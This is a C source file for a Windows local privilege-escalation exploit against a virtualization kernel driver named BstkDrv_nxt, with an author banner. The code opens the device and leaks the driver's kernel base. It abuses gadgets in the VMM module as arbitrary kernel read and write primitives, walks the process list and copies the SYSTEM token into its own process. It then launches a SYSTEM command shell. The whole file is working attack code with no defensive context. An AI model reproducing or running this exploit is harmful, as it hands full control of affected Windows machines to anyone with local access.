#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "bstk_suptable.h"

static void banner(void)
{
    printf(" _._     _,-'\"\"`-._\n");
    printf("(,-.`._,'(       |\\`-/|\n");
    printf("    `-.-' \\) -`( , o o)\n");
    printf("          `-    \\_`\"'-  SiCk // afflicted.sh\n\n");
}

#define DEVU  L"\\Device\\BstkDrv_nxt"
#define COOKIE_MAGIC   0x69726f74u
#define DEV_MAGIC      0x64726962u
#define SESS_MAGIC     0x62697264u

#define G_READ_RVA   0x7D780ull
#define G_WRITE_RVA  0x1F17Eull
#define DRV_NT_GLOBAL 0x5C850ull
#define DRV_NT_AOF    0x5C878ull
#define DRV_NT_NNAMES 0x5C884ull
#define DRV_NT_AON    0x5C888ull
#define DRV_NT_AONO   0x5C890ull
#define PSISP_RVA    0xFC6AF0ull
#define OFF_PID   0x1D0
#define OFF_LINKS 0x1D8
#define OFF_TOKEN 0x248

typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTR;
typedef struct { ULONG Length; HANDLE Root; USTR *Name; ULONG Attr; void *sd,*sqs; } OBJATTR;
typedef struct { PVOID Info; ULONG_PTR St; } IOSB;
typedef LONG (WINAPI *pNtCreateFile)(HANDLE*,ACCESS_MASK,void*,void*,void*,ULONG,ULONG,ULONG,ULONG,void*,ULONG);
typedef LONG (WINAPI *pNtDevIoCtl)(HANDLE,HANDLE,void*,void*,void*,ULONG,void*,ULONG,void*,ULONG);

static HANDLE g_h;
static pNtCreateFile NtCreateFile_;
static pNtDevIoCtl   NtDevIoCtl_;
static uint32_t g_ck, g_sck;
static uint64_t g_pSession, g_drvBase, g_vmmBase, g_ntBase;
static uint64_t g_pGVM, g_pVM;
static uint64_t g_pageU, g_pageK;
static uint64_t g_readG, g_writeG;

static int ioctl_(uint32_t code, void *in, uint32_t il, void *out, uint32_t ol) {
    IOSB io = {0};
    LONG s = NtDevIoCtl_(g_h, NULL, NULL, NULL, &io, code, in, il, out, ol);
    return (int)s;
}
static void hdr(uint8_t *b, uint32_t cbIn, uint32_t cbOut, uint32_t ck, uint32_t sck) {
    *(uint32_t*)(b+0)=ck; *(uint32_t*)(b+4)=sck; *(uint32_t*)(b+8)=cbIn;
    *(uint32_t*)(b+12)=cbOut; *(uint32_t*)(b+16)=0x42000042u; *(uint32_t*)(b+20)=0;
}

static int open_dev(void) {
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    NtCreateFile_ = (pNtCreateFile)GetProcAddress(nt,"NtCreateFile");
    NtDevIoCtl_   = (pNtDevIoCtl)GetProcAddress(nt,"NtDeviceIoControlFile");
    USTR us; us.Buffer=DEVU; us.Length=(USHORT)(wcslen(DEVU)*2); us.MaximumLength=us.Length+2;
    OBJATTR oa={sizeof(oa),NULL,&us,0x40,NULL,NULL}; IOSB io={0};
    LONG s=NtCreateFile_(&g_h,GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE,&oa,&io,
                         NULL,0,3,1,0x20,NULL,0);
    return s==0;
}

static int cookie(void) {
    uint8_t b[0x38]; memset(b,0,sizeof b);
    hdr(b,0x30,0x38,COOKIE_MAGIC,0);
    memcpy(b+0x18,"The Magic Word!",15);
    *(uint32_t*)(b+0x28)=0x330004; *(uint32_t*)(b+0x2c)=0x330004;
    if (ioctl_(0x228204,b,0x30,b,0x38)!=0) return 0;
    g_ck=*(uint32_t*)(b+0x18); g_sck=*(uint32_t*)(b+0x1c); g_pSession=*(uint64_t*)(b+0x30);
    return *(int32_t*)(b+0x14)==0;
}

static int leak_drvbase(void) {
    static uint8_t f[0x4460];
    for (int att=0; att<8; att++) {
        memset(f,0,sizeof f); hdr(f,0x18,0x4460,DEV_MAGIC,SESS_MAGIC);
        int s=ioctl_(0x228208,f,0x18,f,0x4460);
        if (s==0 && *(int32_t*)(f+0x14)==0) break;
        Sleep(40);
    }
    uint32_t cF=*(uint32_t*)(f+0x18);
    uint64_t votes[8]={0}; int nv[8]={0}, best=0;
    for (uint32_t i=0;i<cF && i<312;i++){
        uint64_t pfn=*(uint64_t*)(f+0x20+(size_t)i*56+48);
        if ((pfn>>48)!=0xFFFF) continue;
        if (SUP_ONDISK[i]==0) continue;
        uint64_t rva=SUP_ONDISK[i]-0x140000000ull; if (rva>0x100000) continue;
        uint64_t base=pfn-rva; int fnd=-1;
        for(int k=0;k<8;k++) if(votes[k]==base){fnd=k;break;}
        if(fnd<0) for(int k=0;k<8;k++) if(nv[k]==0){votes[k]=base;fnd=k;break;}
        if(fnd>=0){ nv[fnd]++; if(nv[fnd]>nv[best]) best=fnd; }
    }
    g_drvBase=votes[best];
    printf("[*] bstkdrv  %016llX\n",(unsigned long long)g_drvBase);
    return g_drvBase!=0;
}

static uint64_t ldr_base(const char *name) {
    uint8_t b[0x148]; memset(b,0,sizeof b); hdr(b,0x148,0x28,g_ck,g_sck);
    strcpy((char*)(b+0x20),name); strcpy((char*)(b+0x40),"C:\\d");
    if (ioctl_(0x22820c,b,0x148,b,0x28)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    return *(uint64_t*)(b+0x18);
}

static int page_alloc(void) {
    uint8_t b[0x30]; memset(b,0,sizeof b); hdr(b,0x20,0x30,g_ck,g_sck);
    *(uint32_t*)(b+0x18)=1; b[0x1c]=1; b[0x1d]=1;
    if (ioctl_(0x228228,b,0x20,b,0x30)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    g_pageU=*(uint64_t*)(b+0x18); g_pageK=*(uint64_t*)(b+0x20);
    return (g_pageK>>48)==0xFFFF;
}

static int create_vm(void) {
    uint8_t b[0x58]; memset(b,0,sizeof b); hdr(b,0x58,0x58,DEV_MAGIC,SESS_MAGIC);
    *(uint64_t*)(b+0x18)=0;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=0x20;
    *(uint64_t*)(b+0x28)=0;
    *(uint32_t*)(b+0x30)=0x19730211;
    *(uint32_t*)(b+0x34)=0x28;
    *(uint64_t*)(b+0x38)=g_pSession;
    *(uint32_t*)(b+0x40)=1;
    if (ioctl_(0x22826C,b,0x58,b,0x58)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    g_pVM =*(uint64_t*)(b+0x48);
    g_pGVM=*(uint64_t*)(b+0x50);
    return (g_pGVM>>48)==0xFFFF;
}

static uint32_t op140(uint64_t target, uint32_t edxv, uint64_t r8v, uint64_t gadget_arg) {
    *(uint64_t*)(g_pageU+0x88)=g_pGVM;
    *(uint64_t*)(g_pageU+0xA8)=target;
    *(uint64_t*)(g_pageU+0xC0)=gadget_arg;
    uint8_t b[0x50]; memset(b,0,sizeof b); hdr(b,0x50,0x50,DEV_MAGIC,SESS_MAGIC);
    *(uint64_t*)(b+0x18)=g_pGVM;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=0x140;
    *(uint64_t*)(b+0x28)=0;
    *(uint32_t*)(b+0x30)=0x19730211;
    *(uint32_t*)(b+0x34)=0x20;
    *(uint64_t*)(b+0x38)=g_pageK;
    *(uint32_t*)(b+0x40)=edxv;
    *(uint64_t*)(b+0x48)=r8v;
    ioctl_(0x22826C,b,0x50,b,0x50);
    return *(uint32_t*)(b+0x14);
}

static uint32_t rd32(uint64_t a){ return op140(g_readG, 0, 0, a); }
static uint64_t rd64(uint64_t a){ return (uint64_t)rd32(a) | ((uint64_t)rd32(a+4)<<32); }
static void     wr32(uint64_t a,uint32_t v){ op140(g_writeG, v, a, 0); }
static void     wr64(uint64_t a,uint64_t v){ wr32(a,(uint32_t)v); wr32(a+4,(uint32_t)(v>>32)); }

static int kstrcmp(uint64_t kva, const char *s) {
    for (size_t i=0;;i+=4) {
        uint32_t w = rd32(kva+i);
        for (int j=0;j<4;j++) {
            unsigned char kc = (unsigned char)(w >> (8*j));
            unsigned char lc = (unsigned char)s[i+j];
            if (kc != lc) return (int)kc - (int)lc;
            if (kc == 0) return 0;
        }
    }
}

static uint64_t resolve_export(const char *name) {
    uint64_t aof = rd64(g_drvBase + DRV_NT_AOF);
    uint64_t aon = rd64(g_drvBase + DRV_NT_AON);
    uint64_t aono= rd64(g_drvBase + DRV_NT_AONO);
    uint32_t n   = rd32(g_drvBase + DRV_NT_NNAMES);
    if ((aof>>48)!=0xFFFF || (aon>>48)!=0xFFFF || (aono>>48)!=0xFFFF || n==0 || n>0x20000)
        return 0;
    int lo=0, hi=(int)n-1;
    while (lo<=hi) {
        int mid=(lo+hi)/2;
        uint32_t nameRva = rd32(aon + (uint64_t)mid*4);
        uint64_t nameVA  = g_ntBase + nameRva;
        int c = kstrcmp(nameVA, name);
        if (c==0) {
            uint16_t ord = (uint16_t)rd32(aono + (uint64_t)mid*2);
            uint32_t fRva= rd32(aof + (uint64_t)ord*4);
            return g_ntBase + fRva;
        }
        if (c<0) lo=mid+1; else hi=mid-1;
    }
    return 0;
}

static void enable_priv(HANDLE tok, const char *name) {
    TOKEN_PRIVILEGES tp; LUID luid;
    if (!LookupPrivilegeValueA(NULL, name, &luid)) return;
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
}

static void pop_system_shell(void) {
    HANDLE hTok=NULL, hDup=NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY|TOKEN_ADJUST_DEFAULT|
            TOKEN_ADJUST_SESSIONID|TOKEN_ADJUST_PRIVILEGES, &hTok)) {
        return;
    }
    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
            SecurityImpersonation, TokenPrimary, &hDup)) {
        return;
    }
    enable_priv(hDup, "SeTcbPrivilege");
    enable_priv(hDup, "SeAssignPrimaryTokenPrivilege");
    enable_priv(hDup, "SeIncreaseQuotaPrivilege");

    DWORD sess = WTSGetActiveConsoleSessionId();
    if (sess != 0xFFFFFFFF)
        SetTokenInformation(hDup, TokenSessionId, &sess, sizeof sess);

    STARTUPINFOA si={sizeof si};
    si.lpDesktop = (LPSTR)"winsta0\\default";
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW;
    PROCESS_INFORMATION pi={0};
    char cmd[] = "cmd.exe /k whoami & echo.";
    if (CreateProcessAsUserA(hDup, NULL, cmd, NULL, NULL, FALSE,
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[+] system shell\n");
    } else {
        printf("[-] CreateProcessAsUser failed %lu; falling back to local console\n",
               GetLastError());
        STARTUPINFOA si2={sizeof si2}; PROCESS_INFORMATION pi2={0};
        char c2[]="cmd.exe /k whoami";
        if (CreateProcessA(NULL,c2,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&si2,&pi2))
            printf("[+] system shell\n");
    }
}

int main(int argc, char **argv){
    (void)argc; (void)argv;
    banner();

    if(!open_dev()){ printf("[-] dev\n"); return 1; }
    if(!cookie()){ printf("[-] cookie\n"); return 1; }
    if(!leak_drvbase()){ printf("[-] drvbase\n"); return 1; }

    g_vmmBase = ldr_base("BstkVMMR0_nxt.r0");
    printf("[*] vmmr0    %016llX\n",(unsigned long long)g_vmmBase);
    if((g_vmmBase>>48)!=0xFFFF){ printf("[-] vmm\n"); return 1; }
    g_readG  = g_vmmBase + G_READ_RVA;
    g_writeG = g_vmmBase + G_WRITE_RVA;
    printf("[*] rd32      vmm+7D780   %016llX\n",(unsigned long long)g_readG);
    printf("[*] wr32      vmm+1F17E   %016llX\n",(unsigned long long)g_writeG);

    if(!page_alloc()){ printf("[-] page\n"); return 1; }
    if(!create_vm()){ printf("[-] gvm\n"); return 1; }

    uint32_t vmmMz = rd32(g_vmmBase) & 0xFFFF;
    if(vmmMz!=0x5A4D){ printf("[-] r32\n"); return 1; }

    g_ntBase = rd64(g_drvBase + DRV_NT_GLOBAL);
    printf("[*] ntoskrnl %016llX\n",(unsigned long long)g_ntBase);
    uint32_t ntMz = rd32(g_ntBase) & 0xFFFF;
    if((g_ntBase>>48)!=0xFFFF || ntMz!=0x5A4D){
        printf("[-] nt\n");
        return 1;
    }

    uint64_t pPsis = resolve_export("PsInitialSystemProcess");
    if(pPsis){
        printf("[*] psip      %016llX\n",(unsigned long long)pPsis);
    } else {
        pPsis = g_ntBase + PSISP_RVA;
        printf("[*] psip      %016llX\n",(unsigned long long)pPsis);
    }

    uint64_t sys = rd64(pPsis);
    printf("[*] system    %016llX\n",(unsigned long long)sys);
    if((sys>>48)!=0xFFFF){ printf("[-] system\n"); return 1; }
    uint32_t sysPid = rd32(sys+OFF_PID);
    uint64_t sysTok = rd64(sys+OFF_TOKEN);
    printf("[*] systoken  %016llX\n",(unsigned long long)sysTok);
    if(sysPid!=4 || (sysTok>>48)!=0xFFFF){ printf("[-] token\n"); return 1; }

    uint32_t myPid = GetCurrentProcessId();
    uint64_t me=0, cur=sys;
    for(int i=0;i<100000;i++){
        uint64_t links = rd64(cur+OFF_LINKS);
        uint64_t next  = links - OFF_LINKS;
        if((next>>48)!=0xFFFF) break;
        uint32_t pid = rd32(next+OFF_PID);
        if(pid==myPid){ me=next; break; }
        cur=next; if(cur==sys) break;
    }
    if(!me){ printf("[-] self\n"); return 1; }
    uint64_t myTokBefore = rd64(me+OFF_TOKEN);

    printf("[!] swapping token\n");
    wr64(me+OFF_TOKEN, sysTok);
    uint64_t after = rd64(me+OFF_TOKEN);
    if(after!=sysTok){ printf("[-] write\n"); return 1; }

    pop_system_shell();
    return 0;
}
